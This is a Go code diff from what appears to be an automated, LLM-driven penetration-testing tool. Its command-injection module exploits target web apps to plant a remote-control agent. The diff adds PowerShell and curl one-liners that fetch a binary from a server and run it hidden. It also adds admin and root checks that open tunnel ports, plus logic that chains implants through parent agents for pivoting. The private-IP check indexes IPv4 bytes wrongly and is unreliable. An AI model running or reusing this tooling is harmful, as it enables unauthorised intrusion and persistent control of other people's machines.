@@ -12,10 +12,13 @@ import (
 	"encoding/json"
 	"fmt"
 	"log"
+	"math/rand"
+	"net"
 	"net/url"
 	"os"
 	"regexp"
 	"runtime/debug"
+	"strconv"
 	"strings"
 	"sync"
 	"sync/atomic"
@@ -26,15 +29,16 @@ var cmdiMessageCounter atomic.Uint64
 
 // CommandInjectionSpecialist deploys CallistoAgent through existing agents via TRT API
 type CommandInjectionSpecialist struct {
-	id           string
-	bus          bus.Bus
-	brain        llm.LLM
-	ctx          context.Context
-	trtClient    *trt.Client
-	agentPaw     string // Agent PAW to use for deployment
-	platform     string // Platform of the agent (windows/linux)
-	agentServer  string // TRT server URL for agent download
-	scriptLoader *scripts.Loader
+	id               string
+	bus              bus.Bus
+	brain            llm.LLM
+	ctx              context.Context
+	trtClient        *trt.Client
+	agentPaw         string // Agent PAW to use for deployment
+	platform         string // Platform of the agent (windows/linux)
+	agentServer      string // TRT server URL for -server flag
+	agentDownloadURL string // Agent binary download URL (can be different from agentServer)
+	scriptLoader     *scripts.Loader
 }
 
 // NewCommandInjectionSpecialist creates a new CommandInjectionSpecialist
@@ -44,16 +48,24 @@ func NewCommandInjectionSpecialist(ctx context.Context, id string, eventBus bus.
 		agentServer = "http://192.168.50.10"
 	}
 
+	// Agent download URL can be different from TRT API URL
+	// Used when test server and TRT are in same Docker network
+	agentDownloadURL := os.Getenv("AGENT_DOWNLOAD_URL")
+	if agentDownloadURL == "" {
+		agentDownloadURL = agentServer // Fallback to TRT server
+	}
+
 	return &CommandInjectionSpecialist{
-		id:           id,
-		bus:          eventBus,
-		brain:        llmClient,
-		ctx:          ctx,
-		trtClient:    trtClient,
-		agentPaw:     agentPaw,
-		platform:     platform,
-		agentServer:  agentServer,
-		scriptLoader: scripts.NewLoader(""),
+		id:               id,
+		bus:              eventBus,
+		brain:            llmClient,
+		ctx:              ctx,
+		trtClient:        trtClient,
+		agentPaw:         agentPaw,
+		platform:         platform,
+		agentServer:      agentServer,
+		agentDownloadURL: agentDownloadURL,
+		scriptLoader:     scripts.NewLoader(""),
 	}
 }
 
@@ -138,7 +150,25 @@ func (c *CommandInjectionSpecialist) executeTask(cmdEvent bus.Event) {
 		beforePAWs[a.Paw] = true
 	}
 
-	results := c.deployAgentBothPlatforms(targetURL, actualParam, payloadType)
+	// ============================================================================
+	// Get parent agent info and determine server address for child deployment
+	// If parent has tunnel enabled, use parent's IP:tunnelPort
+	// Otherwise fallback to TRT server address
+	// ============================================================================
+	parentAgent, err := c.getAgentByPaw(c.agentPaw)
+	var serverAddr string
+
+	if err != nil {
+		log.Printf("[%s] Failed to get parent agent info: %v, using TRT server\n", c.id, err)
+		serverAddr = c.agentServer // Fallback to TRT
+	} else {
+		// Parent Agent의 tunnel 정보 확인
+		serverAddr = c.selectParentAddress(parentAgent)
+		log.Printf("[%s] Using server address: %s\n", c.id, serverAddr)
+	}
+
+	// Deploy agent with appropriate server address (parent tunnel or TRT)
+	results := c.deployAgentBothPlatforms(targetURL, actualParam, payloadType, serverAddr)
 
 	// Generate report
 	report := c.generateReportBothPlatforms(results)
@@ -167,7 +197,8 @@ const (
 )
 
 // deployAgentBothPlatforms deploys agent for both Windows and Linux via Command Injection (PARALLEL)
-func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string, payloadType PayloadType) []DeploymentResult {
+// serverAddr: Parent agent address (IP:port) or TRT server URL
+func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, parameter string, payloadType PayloadType, serverAddr string) []DeploymentResult {
 	results := make(chan DeploymentResult, 2)
 	var wg sync.WaitGroup
 
@@ -182,7 +213,7 @@ func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, 
 			} else {
 				log.Printf("[%s] 🐧 Attempting Linux agent deployment via Command Injection...\n", c.id)
 			}
-			result := c.deployAgentViaRCE(targetURL, parameter, p, payloadType)
+			result := c.deployAgentViaRCE(targetURL, parameter, p, payloadType, serverAddr)
 			results <- result
 		}(platform)
 	}
@@ -204,14 +235,15 @@ func (c *CommandInjectionSpecialist) deployAgentBothPlatforms(targetURL string, 
 
 // deployAgentViaRCE deploys CallistoAgent via Command Injection vulnerability
 // Uses Native HTTP Client to avoid URL encoding issues through TRT Remote Executor
-func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string, payloadType PayloadType) DeploymentResult {
+// serverAddr: Parent agent address (IP:port) or TRT server URL
+func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, parameter string, platform string, payloadType PayloadType, serverAddr string) DeploymentResult {
 	result := DeploymentResult{
 		Platform: platform,
 		Success:  false,
 	}
 
-	// Build agent URL
-	agentURL := fmt.Sprintf("%s/agents/%s", c.agentServer, platform)
+	// Build agent URL (use agentDownloadURL for Docker network compatibility)
+	agentURL := fmt.Sprintf("%s/agents/%s", c.agentDownloadURL, platform)
 
 	// Get default agent path
 	agentPath := scripts.GetDefaultAgentPath(platform)
@@ -219,17 +251,26 @@ func (c *CommandInjectionSpecialist) deployAgentViaRCE(targetURL string, paramet
 	log.Printf("[%s] Preparing %s agent deployment via RCE\n", c.id, platform)
 	log.Printf("[%s] Agent URL: %s\n", c.id, agentURL)
 	log.Printf("[%s] Agent Path: %s\n", c.id, agentPath)
+	log.Printf("[%s] Server Address: %s\n", c.id, serverAddr)
 
-	// Generate one-liner deployment command with -server flag
+	// Generate random tunnel port for root/admin agents
+	newTunnelPort := 5000 + rand.Intn(1000)
+
+	// Ensure serverAddr has http:// protocol for Callisto Agent
+	if !strings.HasPrefix(serverAddr, "http://") && !strings.HasPrefix(serverAddr, "https://") {
+		serverAddr = "http://" + serverAddr
+	}
+
+	// Generate one-liner deployment command with privilege check and conditional tunnelPort
 	var deployCommand string
 	if strings.ToLower(platform) == "windows" {
-		// Windows: PowerShell one-liner with -server argument
-		deployCommand = fmt.Sprintf(`powershell -c "IWR -Uri %s -OutFile %s -UseBasicParsing; Start-Process %s -ArgumentList '-server %s' -WindowStyle Hidden"`,
-			agentURL, agentPath, agentPath, c.agentServer)
+		// Windows: PowerShell with admin check + conditional tunnelPort
+		deployCommand = fmt.Sprintf(`powershell -c "IWR -Uri %s -OutFile %s -UseBasicParsing; $isAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator); if ($isAdmin) { Start-Process %s -ArgumentList '-server %s -tunnelPort %d' -WindowStyle Hidden } else { Start-Process %s -ArgumentList '-server %s' -WindowStyle Hidden }"`,
+			agentURL, agentPath, agentPath, serverAddr, newTunnelPort, agentPath, serverAddr)
 	} else {
-		// Linux: curl/wget + chmod + background execution with -server flag
-		deployCommand = fmt.Sprintf(`curl -s -o %s %s && chmod +x %s && nohup %s -server %s > /dev/null 2>&1 &`,
-			agentPath, agentURL, agentPath, agentPath, c.agentServer)
+		// Linux: curl + root check + conditional tunnelPort
+		deployCommand = fmt.Sprintf(`curl -s -o %s %s && chmod +x %s && if [ $(id -u) -eq 0 ]; then nohup %s -server %s -tunnelPort %d > /dev/null 2>&1 & else nohup %s -server %s > /dev/null 2>&1 & fi`,
+			agentPath, agentURL, agentPath, agentPath, serverAddr, newTunnelPort, agentPath, serverAddr)
 	}
 
 	log.Printf("[%s] Deployment command: %s\n", c.id, deployCommand)
@@ -852,6 +893,69 @@ func (c *CommandInjectionSpecialist) parseHostIPAddrs(jsonStr string) []string {
 	}
 
 	return ips
+}
+
+// selectParentAddress selects the best IP address from parent agent for tunneling
+// Priority: Private IP > Public IP > Fallback to TRT server
+func (c *CommandInjectionSpecialist) selectParentAddress(agent *trt.Agent) string {
+	// Convert TunnelPort string to int
+	tunnelPort, err := strconv.Atoi(agent.TunnelPort)
+	if err != nil || tunnelPort <= 0 {
+		log.Printf("[selectParentAddress] Parent agent has no tunnel (port=%s), using TRT server: %s", agent.TunnelPort, c.agentServer)
+		return c.agentServer
+	}
+
+	// Parse IP addresses
+	ips := c.parseHostIPAddrs(agent.HostIPAddrs)
+	if len(ips) == 0 {
+		log.Printf("[selectParentAddress] No IPs found for agent %s, using TRT server: %s", agent.Paw, c.agentServer)
+		return c.agentServer
+	}
+
+	// Helper function to check if IP is private
+	isPrivateIP := func(ip string) bool {
+		// Parse IP
+		parsed := net.ParseIP(ip)
+		if parsed == nil {
+			return false
+		}
+
+		// Check private ranges: 10.x.x.x, 172.16-31.x.x, 192.168.x.x
+		if parsed.IsLoopback() {
+			return true
+		}
+
+		// 10.0.0.0/8
+		if parsed[0] == 10 {
+			return true
+		}
+
+		// 172.16.0.0/12
+		if parsed[0] == 172 && parsed[1] >= 16 && parsed[1] <= 31 {
+			return true
+		}
+
+		// 192.168.0.0/16
+		if parsed[0] == 192 && parsed[1] == 168 {
+			return true
+		}
+
+		return false
+	}
+
+	// First, try to find a private IP
+	for _, ip := range ips {
+		if isPrivateIP(ip) {
+			serverAddr := fmt.Sprintf("%s:%d", ip, tunnelPort)
+			log.Printf("[selectParentAddress] Selected private IP: %s", serverAddr)
+			return serverAddr
+		}
+	}
+
+	// If no private IP, use the first available IP
+	serverAddr := fmt.Sprintf("%s:%d", ips[0], tunnelPort)
+	log.Printf("[selectParentAddress] No private IP found, using first IP: %s", serverAddr)
+	return serverAddr
 }
 
 // ============================================================================
